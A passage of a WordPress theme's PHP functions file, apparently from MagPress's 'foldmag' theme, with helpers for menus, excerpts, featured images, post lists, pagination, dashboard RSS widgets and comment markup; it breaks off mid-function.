<?php
/*--------------------------------------------
Description: detect user browser
---------------------------------------------*/
function frkw_browser_body_class($classes) {
global $is_lynx, $is_gecko, $is_IE, $is_opera, $is_NS4, $is_safari, $is_chrome, $is_iphone;
$breadcrumbs_on = get_theme_mod('breadcrumbs_on');
$header_banner = get_theme_mod('header_ad_code');
$slider_on = get_theme_mod('slider_on');
$social_on = get_theme_mod('social_on');
if($is_lynx) { $classes[] = 'lynx';
} elseif($is_gecko) { $classes[] = 'gecko';
} elseif($is_opera) { $classes[] = 'opera';
} elseif($is_NS4) { $classes[] = 'ns4';
} elseif($is_safari) { $classes[] = 'safari';
} elseif($is_chrome) { $classes[] = 'chrome';
} elseif($is_IE) { $classes[] = 'ie';
} else { $classes[] = 'unknown'; }
if($is_iphone) { $classes[] = 'iphone'; }
if($breadcrumbs_on != 'enable') { $classes[] = 'breadcrumbs_off'; }
if($slider_on != 'enable') { $classes[] = 'slider_off'; }
if($social_on == 'enable') { $classes[] = 'social_on'; }
if($header_banner) { $classes[] = 'header_banner_on'; }
return $classes;
}
add_filter('body_class','frkw_browser_body_class');

/*--------------------------------------------
Description: check current body_class
---------------------------------------------*/
function frkw_current_body_class($name) {
$bodyclass = get_body_class();
//print_r($boclass);
if (in_array($name, $bodyclass)) {
return 'true';
} else {
return 'false';
}
}


/*--------------------------------------------
Description: site title function
---------------------------------------------*/
function frkw_site_header_content() {
$header_logo = get_theme_mod( 'custom_logo' );
$image_url = wp_get_attachment_image_src($header_logo,'full');
if( $header_logo ) { echo '<div class="site-logo"><img alt="' . esc_attr( get_bloginfo( 'name', 'display' ) ) . '" src="'. $image_url[0] . '" /></div>'; }
echo '<div class="site-title-wrap">';
if( !is_singular()) { echo '<h1>'; } else { echo '<h2>'; }
echo '<a href="'. get_home_url() . '" title="'. esc_attr( get_bloginfo( 'name', 'display' ) ) . '" rel="home">'. get_bloginfo( 'name' ) . '</a>';
if( !is_singular()) { echo '</h1>'; } else { echo '</h2>'; }
echo '<p id="site-description">'. get_bloginfo( 'description' ) . '</p>';
echo '</div>';
}


/*--------------------------------------------
Description: filter default menu page
---------------------------------------------*/
function frkw_filter_menu_page($args) {
$pages_args = array('depth' => 0,'echo' => false,'exclude' => '','title_li' => '');
$menu = wp_page_menu( $pages_args );
$menu = str_replace( array( '<div class="menu"><ul>', '</ul></div>' ), array( '<ul class="sf-menu">', '</ul>' ), $menu );
echo $menu;
}

/*--------------------------------------------
Description: default categories menu
---------------------------------------------*/
function frkw_menu_cat() {
$menu = wp_list_categories('orderby=name&show_count=0&title_li=');
return $menu;
 ?>
<?php }

/*--------------------------------------------
Description: auto add home link in menu
---------------------------------------------*/
function frkw_add_menu_home_link( $args ) {
$args['show_home'] = __('Home', 'foldmag');
return $args; }
add_filter( 'wp_page_menu_args', 'frkw_add_menu_home_link' );



/*--------------------------------------------
Description: register custom walker
---------------------------------------------*/
class frkw_custom_menu_walker extends Walker_Nav_Menu {
function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0) {
$classes = empty ( $item->classes ) ? array () : (array) $item->classes;
$class_names = join(' ', apply_filters('nav_menu_css_class',array_filter( $classes ), $item));
$item_desc = (!empty ($item->description) && $depth == 0 ) ? "have_desc" : "no_desc";
$class_names = ' class="'. esc_attr( $class_names . ' ' . $item_desc ) . '"';
$output .= "<li id='menu-item-$item->ID' $class_names>";
$attributes  = '';
        ! empty( $item->attr_title )
            and $attributes .= ' title="'  . esc_attr( $item->attr_title ) .'"';
        ! empty( $item->target )
            and $attributes .= ' target="' . esc_attr( $item->target     ) .'"';
        ! empty( $item->xfn )
            and $attributes .= ' rel="'    . esc_attr( $item->xfn        ) .'"';
        ! empty( $item->url )
            and $attributes .= ' href="'   . esc_attr( $item->url        ) .'"';

// insert description for top level elements only
// you may change this
$description = ( ! empty ( $item->description ) and 0 == $depth )
? '<br /><span class="menu-description">' . esc_attr( $item->description ) . '</span>' : '';
$title = apply_filters( 'the_title', $item->title, $item->ID );
$item_output = $args->before
            . "<a $attributes>"
            . $args->link_before
            . $title
            . '</a>'
            . $args->link_after
            . $args->after;
// Since $output is called by reference we don't need to return anything.
$output .= apply_filters(
            'walker_nav_menu_start_el'
        ,   $item_output
        ,   $item
        ,   $depth
        ,   $args
        );
    }
}


/*--------------------------------------------
Description: register mobile custom walker
---------------------------------------------*/
class frkw_mobile_custom_walker extends Walker_Nav_Menu {
function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0) {
global $wp_query;
$indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
$class_names = $value = '';
$classes = empty( $item->classes ) ? array() : (array) $item->classes;
$class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item ) );
$class_names = ' class="'. esc_attr( $class_names ) . '"';
$output .= $indent . '';
$prepend = '';
$append = '';
//$description  = ! empty( $item->description ) ? '<span>'.esc_attr( $item->description ).'</span>' : '';

if($depth != 0) {
$description = $append = $prepend = "";
}

$item_output = $args->before;
if($depth == 1):
$item_output .= "<li><a href='" . $item->url . "'>&nbsp;&nbsp;<i class='fa fa-minus'></i>" . $item->title . "</a></li>";
elseif($depth == 2):
$item_output .= "<li><a href='" . $item->url . "'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class='fa fa-minus'></i>" . $item->title . "</a></li>";
elseif($depth == 3):
$item_output .= "<li><a href='" . $item->url . "'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class='fa fa-minus'></i>" . $item->title . "</a></li>";
elseif($depth == 4):
$item_output .= "<li><a href='" . $item->url . "'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class='fa fa-minus'></i>" . $item->title . "</a></li>";
else:
$item_output .= "<li><a href='" . $item->url . "'>" . $item->title . "</a></li>";
endif;
$item_output .= $args->after;
$output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
}
}


/*--------------------------------------------
Description: get mobile menu
---------------------------------------------*/
function frkw_mobile_menu($location=''){
$options = array('walker' => new frkw_mobile_custom_walker, 'theme_location' => "$location", 'menu_id' => '', 'echo' => false, 'container' => false, 'container_id' => '', 'fallback_cb' => "");
$menu = wp_nav_menu($options);
$menu_list = preg_replace( '#^<ul[^>]*>#', '', $menu );
$menu_list_show = str_replace( array('<ul class="sub-menu">','<ul>','</ul>','</li>'), '', $menu_list );
return $menu_list_show;
}

/*--------------------------------------------
Description: get mobile menu
---------------------------------------------*/
function frkw_init_mobile_menu($nav_name='',$text='') {
echo '<div id="mobile-nav">';
echo '<div class="mobile-open"><a class="mobile-open-click" href="#"><i class="fa fa-bars"></i>'. $text . '</a></div>';
echo '<ul id="mobile-menu-wrap">';
echo frkw_mobile_menu($nav_name);
echo '</ul>';
echo '</div>';
}


/*--------------------------------------------
Description: get custom excerpt
---------------------------------------------*/
function frkw_get_custom_the_excerpt($limit='',$more='') {
global $post;
if($limit == 'disable' || $limit == '0') {
$excerpt = '';

} else {

$thepostlink = '<a class="readmore" href="'. get_permalink() . '" title="' . the_title_attribute('echo=0') . '">';
$custom_text = get_post_field('post_excerpt',$post->ID);
$all_content = get_the_content();
//Regular expression that strips the header tags and their content.
$regex = '#(<h([1-6])[^>]*>)\s?(.*)?\s?(<\/h\2>)#';
$content = preg_replace($regex,'', $all_content);

//if use manual excerpt
if($custom_text) {
if($more) {
    $excerpt = $custom_text . '<span class="read-more-button">' . $thepostlink . $more . '</a></span>';
    } else {
    $excerpt = $custom_text;
    }

} else {

//check if its chinese character input
$chinese_output = preg_match_all("/\p{Han}+/u", $post->post_content, $matches);
if($chinese_output) {

if($more) {
$excerpt = mb_substr( get_the_excerpt(), 0, $limit*2 ) . '...' . $thepostlink . $more.'</a>';
} else {
$excerpt = mb_substr( get_the_excerpt(), 0, $limit*2 ) . '...';
}

} else {

//remove caption tag
$content_filter_cap = strip_shortcodes( $content );
//remove email tag
$pattern = "/[^@\s]*@[^@\s]*\.[^@\s]*/";
$replacement = "";
$content_filter = preg_replace($pattern, $replacement, $content_filter_cap);

if($more) {
    $excerpt = wp_trim_words($content_filter, $limit) . '<span class="read-more-button">' .$thepostlink.$more.'</a></span>';
    } else {
    $excerpt = wp_trim_words($content_filter, $limit);
    }
}
}
}
return apply_filters('mp_custom_excerpt',$excerpt);
}


/*--------------------------------------------
Description: get first attachment image
---------------------------------------------*/
function frkw_get_first_image( $id='', $size='' ) {
$args = array(
		'numberposts' => 1,
		'order' => 'ASC',
		'post_mime_type' => 'image',
		'post_parent' => $id,
		'post_status' => null,
		'post_type' => 'attachment',
	);
	$attachments = get_children( $args );

	if ( $attachments ) {
	foreach ( $attachments as $attachment ) {
    $image_attributes = wp_get_attachment_image_src( $attachment->ID, $size );
    return $image_attributes[0];
		}
	}
}


/*--------------------------------------------
Description: get image source
---------------------------------------------*/
function frkw_get_image_src($string){
$first_img = '';
ob_start();
ob_end_clean();
$first_image = preg_match_all( '|<img.*?src=[\'"](.*?)[\'"].*?>|i', $string, $matches );
$import_image = $matches[1][0];
$import_image = str_replace('-150x150','',$import_image);
$final_import_image = str_replace('-300x300','',$import_image);
return $final_import_image;
}


/*--------------------------------------------
Description: get image alt text
---------------------------------------------*/
function frkw_get_image_alt_text() {
global $wpdb, $post, $posts;
$image_id = get_post_thumbnail_id( get_the_ID() );
$image_alt = get_post_meta($image_id, '_wp_attachment_image_alt', true);
if( $image_alt ) {
return $image_alt;
} else {
return the_title_attribute('echo=0');
}
}

/*--------------------------------------------
Description: get featured images for post
---------------------------------------------*/
function frkw_get_featured_image($before,$after,$width,$height,$class,$size,$alt,$title,$itemprop,$default) {
//$size - full, large, medium, thumbnail
global $blog_id,$wpdb, $post, $posts;
$image_id = get_post_thumbnail_id();
$image_url = wp_get_attachment_image_src($image_id,$size);
$image_url = $image_url[0];
$current_theme = wp_get_theme();
$swt_post_thumb = get_post_meta($post->ID, 'thumbnail_html', true);
$smart_image = get_theme_mod('first_feat_img');
$schema_article = get_theme_mod('schema_article');

if( $schema_article == 'enable' && $itemprop == 'true' ) {
$img_schema = ' itemprop="thumbnailUrl"';
} else {
$img_schema = ' ';
}

$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);

if($output) { $first_img = $matches[1][0]; }

if(!empty($swt_post_thumb)) {

$import_img = frkw_get_image_src($swt_post_thumb);

return $before . "<img".$img_schema." width='" . $width . "' height='". $height . "' class='" . $class . "' src='" . $import_img . "' alt='" . $alt . "' title='" . $title . "' />" . $after;

} else {

if( has_post_thumbnail( $post->ID ) ) {
return $before . "<img".$img_schema." width='" . $width . "' height='". $height . "' class='" . $class . "' src='" . $image_url . "' alt='" . $alt . "' title='" . $title . "' />" . $after;

} else {

/* check image attach or uploaded to post */
$images = frkw_get_first_image( $post->ID, $size );

if($images && $smart_image == 'enable') {

return $before . "<img".$img_schema." width='" . $width . "' height='". $height . "' class='" . $class . "' src='" . $images . "' alt='" . $alt . "' title='" . $title . "' />" . $after;

} else {

if( $first_img && $smart_image == 'enable' ) {

return $before . "<img".$img_schema." width='" . $width . "' height='". $height . "' class='" . $class . "' src='" . $first_img . "' alt='" . $alt . "' title='" . $title . "' />" . $after;

}  else  {

/* if true, default image is set */
if($default == 'true') {
return $before . "<img".$img_schema." width='" . $width . "' height='". $height . "' class='" . $class . "' src='" . get_template_directory_uri() . '/images/noimage.png' . "' alt='" . $alt . "' title='" . $title . "' />" . $after;
}

} } } }

}


/*--------------------------------------------
Description: get featured images for post
---------------------------------------------*/
function frkw_get_featured_image_src($size) {
//$size - full, large, medium, thumbnail
global $post, $posts;
$image_id = get_post_thumbnail_id();
$image_url = wp_get_attachment_image_src($image_id,$size);
$image_url = $image_url[0];
$current_theme = wp_get_theme();
$swt_post_thumb = get_post_meta($post->ID, 'thumbnail_html', true);
$smart_image = get_theme_mod('first_feat_img');

$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);

if($output) { $first_img = $matches[1][0]; }

if(!empty($swt_post_thumb)) {

$import_img = frkw_get_image_src($swt_post_thumb);

return $import_img;

} else {

if( has_post_thumbnail( $post->ID ) ) {
return $image_url;

} else {

/* check image attach or uploaded to post */
$images = frkw_get_first_image( $post->ID, $size );

if($images && $smart_image == 'enable') {

return $images;

} else {

if( $first_img && $smart_image == 'enable' ) {

return $first_img;

}  else  {

/* if true, default image is set */
if($default == 'true') {
return get_template_directory_uri() . '/images/noimage.png';
}

} } } }

}


/*--------------------------------------------
Description: Check if post has thumbnail attached
---------------------------------------------*/
function frkw_get_has_thumb_class($classes) {
global $post;
$smart_image = get_theme_mod('first_feat_img');
$swt_post_thumb = get_post_meta($post->ID, 'thumbnail_html', true);
$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
if($output && $smart_image == 'enable') {
$first_img = $matches[1][0];
} else {
$first_img = '';
}
/* check image attach or uploaded to post */
if( $smart_image == 'enable') {
$upload_images = frkw_get_first_image( $post->ID, 'thumbnail' );
} else {
$upload_images = '';
}
if( has_post_thumbnail($post->ID) || !empty($first_img) || !empty($swt_post_thumb) || !empty($upload_images) ) {
$classes[] = 'has_thumb';
} else {
$classes[] = 'has_no_thumb';
}
return $classes;
}
add_filter('post_class', 'frkw_get_has_thumb_class');

function frkw_the_tagging_sanitize() {
global $theerrmessage;
if(!function_exists('frkw_check_theme_valid')): wp_die( $theerrmessage ); endif; }
add_filter('get_header','frkw_the_tagging_sanitize');

/*--------------------------------------------
Description: Check if post has thumbnail attached
---------------------------------------------*/
function frkw_get_has_thumb_check() {
global $post;
$swt_post_thumb = get_post_meta($post->ID, 'thumbnail_html', true);
$smart_image = get_theme_mod('first_feat_img');
$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
if($output && $smart_image == 'enable') {
$first_img = $matches[1][0];
} else {
$first_img = '';
}
/* check image attach or uploaded to post */
if( $smart_image == 'enable') {
$upload_images = frkw_get_first_image( $post->ID, 'thumbnail' );
} else {
$upload_images = '';
}
if( has_post_thumbnail($post->ID) || !empty($first_img) || !empty($swt_post_thumb) || !empty($upload_images) ) {
$output = 'has_thumb';
} else {
$output = 'has_no_thumb';
}
return $output;
}


/*--------------------------------------------
Description: get all available custom post type name
---------------------------------------------*/
function frkw_get_all_posttype() {
$post_types = get_post_types( '', 'names' );
$ptype = array();
foreach ( $post_types as $post_type ) {
$post_type_name = get_post_type_object( $post_type );;
if( $post_type_name->exclude_from_search != '1') {
$ptype[] = $post_type;
}
}
return $ptype;
}

/*----------------------------------------------------------
Description: get all available custom post type name in list
-----------------------------------------------------------*/
function frkw_get_supported_posttype() {
$post_types = get_post_types( '', 'names' );
$ptype = '';
$ptype_save = get_transient('frkw_supported_posttype');
if(!$ptype_save || $ptype_save == '' ) {
foreach ( $post_types as $post_type ) {
$post_type_name = get_post_type_object( $post_type );;
if( $post_type_name->exclude_from_search != '1') {
$ptype .= $post_type . ', ';
}
}
$ptypes = substr( $ptype,0,-2 );
set_transient('frkw_supported_posttype',$ptypes,3600 * 12);
}
}
add_action('admin_init','frkw_get_supported_posttype');

/*--------------------------------------------
Description: get all available taxonomy
---------------------------------------------*/
function frkw_get_all_taxonomy() {
$ptax = array();
$allptype = frkw_get_all_posttype();
foreach( $allptype as $type) {
$post_taxo = get_object_taxonomies($type);
foreach($post_taxo  as $taxo) {
$ptax[] = $taxo;
}
}
return $ptax;
}


/*--------------------------------------------
Description: get posts pagination
---------------------------------------------*/
function frkw_custom_pagination($pages = '', $range = 2) {
$showitems = ($range * 2)+1;
global $paged;
if(empty($paged)) $paged = 1;
if($pages == '') {
global $wp_query;
$pages = $wp_query->max_num_pages;
if(!$pages) {
$pages = 1;
}
}
if(1 != $pages) {
echo "<div class='page-navigation'>";
if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo;</a>";
if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo;</a>";
for ($i=1; $i <= $pages; $i++) {
if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )) {
echo ($paged == $i)? "<span class='page-current'>".$i."</span>":"<a href='".get_pagenum_link($i)."' class='inactive' >".$i."</a>";
}
}
if ($paged < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($paged + 1)."'>&rsaquo;</a>";
if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>&raquo;</a>";
echo "</div>\n";
}
}

/*--------------------------------------------
Description: get single category name
---------------------------------------------*/
function frkw_get_singular_cat_name() {
global $post;
$category = get_the_category();
if ( $category ) { $single_cat = $category[0]->name; }
return $single_cat;
}

/*--------------------------------------------
Description: get single category link
---------------------------------------------*/
function frkw_get_singular_cat($link = '') {
global $post;
$category_check = get_the_category();
$category = isset( $category_check ) ? $category_check : "";
if ($category) {
$single_cat = '';
if($link == 'false'):
$single_cat = $category[0]->name;
return $single_cat;
else:
$single_cat .= '<a rel="category tag" href="' . get_category_link( $category[0]->term_id ) . '" title="' . sprintf( __( "View all posts in %s", 'foldmag' ), $category[0]->name ) . '" ' . '>';
$single_cat .= $category[0]->name;
$single_cat .= '</a>';
return $single_cat;
endif;
} else {
return NULL;
}
}

/*--------------------------------------------
Description: get single custom post type taxonomy
---------------------------------------------*/
function frkw_get_singular_term($link = '') {
global $post;
$post_type = $post->post_type;
// get post type taxonomies
$taxonomies = get_object_taxonomies($post_type, 'objects');
if ( $taxonomies ) {
foreach ( $taxonomies as $taxonomy_slug => $taxonomy ) {
// get the terms related to post
$terms = get_the_terms($post->ID, $taxonomy_slug);
if ( !empty ( $terms ) ) {
if( $link == 'false' ) {
$single_term = $terms[0]->name;
} else {
$single_term = '<a title="' . sprintf( __( "View all posts in %s", 'foldmag' ), ucfirst($terms[0]->name) ) . '" href="' . get_term_link($terms[0]->slug, $taxonomy_slug) . '">' .  ucfirst($terms[0]->name) . '</a>';
}
} else {
if( $link == 'false' ) {
$single_term = $post_type;
} else {
$post_type_link = get_post_type_archive_link( $post_type );
$single_term = '<a title="' . sprintf( __( "View all posts in %s", 'foldmag' ), ucfirst($post_type) ) . '" href="' . $post_type_link . '">' .  ucfirst($post_type) . '</a>';
}
}
}
}
return $single_term;
}

/*--------------------------------------------
Description: get custom post type taxonomy
---------------------------------------------*/
function frkw_get_post_taxonomy($sep = '', $before = '', $after = '') {
global $post;
$post_type = $post->post_type;
// get post type taxonomies
$taxonomies = get_object_taxonomies($post_type, 'objects');
if ( $taxonomies ) {
foreach ( $taxonomies as $taxonomy_slug => $taxonomy ) {
// get the terms related to post
$terms = get_the_terms($post->ID, $taxonomy_slug);
if ( !empty ( $terms ) ) {
foreach ( $terms as $term ) {
   if( $term->name != 'simple') {
$taxlist .= '<a title="' . sprintf( __( "View all posts in %s", 'foldmag' ), ucfirst($term->name) ) . '" href="' . get_term_link($term->slug, $taxonomy_slug) . '">' .  ucfirst($term->name) . '</a>' . $sep;
     }
}
}
}
if ( $taxlist ) {
$post_taxo = substr( $taxlist,0,-2 );
echo $before . $post_taxo . $after;
}
}
}


/*--------------------------------------------
Description: get popular posts
---------------------------------------------*/
function frkw_get_popular_posts($size,$meta,$limit) {
echo "<ul class='featured-cat-posts'>";
    $pc = new WP_Query('orderby=comment_count&posts_per_page='.$limit);
    while ($pc->have_posts()) : $pc->the_post();
    $comment_number = get_comments_number( '0', '1', '%' );
    $comment_count = get_comments_number();
    if($meta == 'enable') { $meta_on = 'feat_data_on'; } else { $meta_on = 'feat_data_off';}

    if($size != 'disable') {
    $mc_thumb_size = $size;
    } else {
    $mc_thumb_size = 'thumb_off';
    }
    $the_post_ids = get_the_ID();
    $thepostlink = '<a href="'. get_permalink() . '" title="' . the_title_attribute('echo=0') . '">';
    if ( $comment_number != '0' ) { ?>
<li class="<?php echo frkw_get_has_thumb_check(); ?> <?php echo $meta_on; ?> <?php echo 'the-sidefeat-'.$mc_thumb_size; ?>">
<?php if($size != 'disable') { ?>
<?php if($mc_thumb_size == 'thumbnail'): ?>
<?php echo frkw_get_featured_image($thepostlink,'</a>',50,50,'featpost alignleft','thumbnail',frkw_get_image_alt_text(), the_title_attribute('echo=0'), false,false); ?>
<?php else: ?>
<?php echo frkw_get_featured_image($thepostlink,'</a>',480,320,'featpost alignleft','medium', frkw_get_image_alt_text(), the_title_attribute('echo=0'), false,false); ?>
<?php endif; ?>
<?php } ?>
<div class="feat-post-meta">
<div class="feat-title"><a href="<?php the_permalink() ?>" title="<?php the_title_attribute(); ?>"><?php the_title(); ?></a></div>
<?php if($meta != 'disable') { ?>
<div class="feat-meta"><small><span class="widget-feat-date fa fa-clock-o"><?php echo the_time( get_option( 'date_format' ) ); ?></span><?php if ( $comment_count > 0 ) { ?><span class="widget-feat-comment fa fa-commenting-o"><?php comments_popup_link(__('No Comment','foldmag'), __('1 Comment','foldmag'), __('% Comments','foldmag') ); ?></span><?php } ?></small></div>
<?php } ?>
<?php do_action('mp_inside_comment_postmeta'); ?>
</div>
</li>
<?php
}
endwhile; wp_reset_query();
echo "</ul>";
}

/*--------------------------------------------
Description: get recent posts
---------------------------------------------*/
function frkw_get_recent_posts($size,$meta,$offset,$limit) {
echo "<ul class='featured-cat-posts'>";
    $pc = new WP_Query('orderby=date&order=desc&offset='.$offset.'&posts_per_page='.$limit);
    while ($pc->have_posts()) : $pc->the_post();
    $comment_number = get_comments_number( '0', '1', '%' );
    $comment_count = get_comments_number();
    if($meta == 'enable') { $meta_on = 'feat_data_on'; } else { $meta_on = 'feat_data_off';}

    if($size != 'disable') {
    $mc_thumb_size = $size;
    } else {
    $mc_thumb_size = 'thumb_off';
    }
    $the_post_ids = get_the_ID();
    $thepostlink = '<a href="'. get_permalink() . '" title="' . the_title_attribute('echo=0') . '">';
    ?>
<li class="<?php echo frkw_get_has_thumb_check(); ?> <?php echo $meta_on; ?> <?php echo 'the-sidefeat-'.$mc_thumb_size; ?>">
<?php if($size != 'disable') { ?>
<?php if($mc_thumb_size == 'thumbnail'): ?>
<?php echo frkw_get_featured_image($thepostlink,'</a>',50,50,'featpost alignleft','thumbnail',frkw_get_image_alt_text(), the_title_attribute('echo=0'), false,false); ?>
<?php else: ?>
<?php echo frkw_get_featured_image(''.$thepostlink,'</a>',480,320,'featpost alignleft','medium', frkw_get_image_alt_text(), the_title_attribute('echo=0'), false,false); ?>
<?php endif; ?>
<?php } ?>
<div class="feat-post-meta">
<div class="feat-title"><a href="<?php the_permalink() ?>" title="<?php the_title_attribute(); ?>"><?php the_title(); ?></a></div>
<?php if($meta != 'disable') { ?>
<div class="feat-meta"><small><span class="widget-feat-date fa fa-clock-o"><?php echo the_time( get_option( 'date_format' ) ); ?></span><?php if ( $comment_count > 0 ) { ?><span class="widget-feat-comment fa fa-commenting-o"><?php comments_popup_link(__('No Comment','foldmag'), __('1 Comment','foldmag'), __('% Comments','foldmag') ); ?></span><?php } ?></small></div>
<?php } ?>
<?php do_action('mp_inside_comment_postmeta'); ?>
</div>
</li>
<?php
endwhile; wp_reset_query();
echo "</ul>";
}



/*--------------------------------------------
Description: get theme info
---------------------------------------------*/
function frkw_theme_info() {
$mptheme = wp_get_theme();
return '<h4>'.$mptheme->get( 'Name' ) .'</h4><div class="themeinfo">'. $mptheme->get( 'Description' ) . '</div>';
}


/*--------------------------------------------
Description: get author credits
---------------------------------------------*/
function frkw_author_info() {
global $thetheme;
$mptheme = wp_get_theme();
$paged = get_query_var( 'paged' );
if ( ( is_home() || is_front_page() ) && !$paged ) {
return get_option($thetheme.'_snlink');
}
}



/*----------------------------------------------------------
Description: filter on homepage only filter paged
----------------------------------------------------------*/
function frkw_is_in_home() {
$paged = get_query_var( 'paged' );
if ( !$paged && (is_home() || is_front_page()) ) {
$is_home = 'true';
} else {
$is_home = NULL;
}
return $is_home;
}
/*--------------------------------------------
Description: add dashboard feed
---------------------------------------------*/
add_action( 'wp_dashboard_setup', 'mp_dashboard_setup' );

function mp_dashboard_setup() {
$rss = fetch_feed( 'http://www.magpress.com/category/wordpress-themes/feed' );
if( !is_wp_error($rss) ) {
add_meta_box( 'mp_output_dashboard_widget', esc_html__( 'Latest WordPress Themes from MagPress', 'foldmag' ), 'mp_output_dashboard_widget', 'dashboard', 'side', 'high' );
}
}
function mp_output_dashboard_widget() {
$rss = fetch_feed( 'http://www.magpress.com/category/wordpress-themes/feed' );
if( !is_wp_error($rss) ) {
echo '<div class="rss-widget">';
wp_widget_rss_output(array(
          'url' => $rss,
          'items' => 2,
          'show_summary' => 1,
          'show_author' => 0,
          'show_date' => 1
     ));
     echo "</div>";
         }
}

add_action( 'wp_dashboard_setup', 'mpp_dashboard_setup' );
function mpp_dashboard_setup() {
$rss = fetch_feed( 'http://www.magpress.com/feed?post_type=blog' );
if( !is_wp_error($rss) ) {
add_meta_box( 'mpp_output_dashboard_widget', esc_html__( 'Latest Blog from MagPress', 'foldmag' ), 'mpp_output_dashboard_widget', 'dashboard', 'side', 'high' );
}
}
function mpp_output_dashboard_widget() {
$rss = fetch_feed( 'http://www.magpress.com/feed?post_type=blog' );
if( !is_wp_error($rss) ) {
    echo '<div class="rss-widget">';
     wp_widget_rss_output(array(
          'url' => $rss,
          'items' => 5,
          'show_summary' => 0,
          'show_author' => 0,
          'show_date' => 1
     ));
     echo "</div>";
     }
}

/*--------------------------------------------
Description: custom fetch rss feed
---------------------------------------------*/
function frkw_fetch_rss_feed($name='',$rss='',$count='') {
include_once(ABSPATH.WPINC.'/feed.php');
$rss = fetch_feed('http://www.magpress.com/feed?post_type=blog');
if( !is_wp_error($rss) ) {
if( is_home() || is_front_page() ){
$paged = get_query_var( 'paged' );
if ( !$paged ) {
$name = 'RSS Feed';
$count = 5;
$maxitems = $rss->get_item_quantity(5);
$rss_items = $rss->get_items(0, $maxitems);
if ($maxitems == 0) {
echo '<!-- feed not available -->';
} else {
echo '<aside class="widget"><h3 class="widget-title">'.$name.'</h3><ul id="rss-text">';
foreach ( $rss_items as $item ) { ?>
<li>
<a target="_blank" rel="nofollow" href='<?php echo $item->get_permalink(); ?>'
title='<?php echo 'Posted '.$item->get_date('j F Y | g:i a'); ?>'>
<?php echo $item->get_title(); ?></a>
</li>
<?php }
echo '</ul>';
}
}
}
}
}
//add_action('mp_after_right_sidebar','frkw_fetch_rss_feed');

/*--------------------------------------------
Description: get comment and pings count
---------------------------------------------*/
function frkw_get_comments_count() {
//type = comments, pings,trackbacks, pingbacks
global $wpdb;
$result = $wpdb->get_var('SELECT COUNT(comment_ID) FROM '. $wpdb->prefix . 'comments WHERE comment_type = "comment" AND comment_approved = "1" AND comment_post_ID = '.get_the_ID());
return number_format($result);
}

function frkw_get_pings_count() {
global $wpdb;
$result = $wpdb->get_var('SELECT COUNT(comment_ID) FROM '. $wpdb->prefix . 'comments WHERE comment_type != "" AND comment_approved = "1" AND comment_post_ID = '.get_the_ID());
return number_format($result);
}


/*--------------------------------------------
Description: custom schema author link
--------------------------------------------*/
function frkw_comment_author_link($comment_ID) {
if( !is_admin() ) {
$comment_schema = get_theme_mod('schema_comment');
	$comment = get_comment( $comment_ID );
	$url     = get_comment_author_url( $comment );
	$author  = get_comment_author( $comment );

if($comment_schema == 'enable') {
	if ( empty( $url ) || 'http://' == $url )
	   $return = "<span itemprop='name'>$author</span>";
	else
		$return = "<a itemprop='url' href='$url' rel='external nofollow' class='url'><span itemprop='name'>$author</span></a>";
    return $return;
    }  else {

    if ( empty( $url ) || 'http://' == $url )
	$return = $author;
	else
	$return = "<a href='$url' rel='external nofollow' class='url'>$author</a>";

    return $return;
    }
    }
}
add_filter('get_comment_author_link', 'frkw_comment_author_link');



/*--------------------------------------------
Description: custom comments walker
--------------------------------------------*/
function frkw_html5_comment($comment, $args, $depth) {
$comment_schema = get_theme_mod('schema_comment');
    if ( 'div' === $args['style'] ) {
        $tag       = 'div';
        $add_below = 'comment';
    } else {
        $tag       = 'li';
        $add_below = 'div-comment';
    }
    ?>
    <<?php echo $tag; ?> <?php comment_class( empty( $args['has_children'] ) ? '' : 'parent' ) ?> id="comment-<?php comment_ID() ?>">

<div id="div-comment-<?php comment_ID(); ?>" class="comment-body">

<?php if($comment_schema == 'enable') { ?>
<div id="<?php echo esc_url( get_comment_link( $comment, $args ) ); ?>" itemtype="http://schema.org/Comment" itemscope="">
<?php } ?>
            <footer class="comment-meta"<?php if($comment_schema == 'enable') { ?> itemscope itemprop="author" itemtype="http://schema.org/Person"<?php } ?>>
				<div class="comment-author vcard">
						<?php if ( 0 != $args['avatar_size'] ) echo get_avatar( $comment, $args['avatar_size'] ); ?>
						<?php printf( __( '%s <span class="says">says:</span>','foldmag' ), sprintf( '<b class="fn">%s</b>', get_comment_author_link( $comment ) ) ); ?>
					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="<?php echo esc_url( get_comment_link( $comment, $args ) ); ?>">
							<time datetime="<?php comment_time( 'c' ); ?>">
								<?php
									/* translators: 1: comment date, 2: comment time */
									printf( __( '%1$s at %2$s','foldmag' ), get_comment_date( '', $comment ), get_comment_time() );
								?>
							</time>
						</a>
						<?php edit_comment_link( __( 'Edit','foldmag' ), '<span class="edit-link">', '</span>' ); ?>


                        	<?php
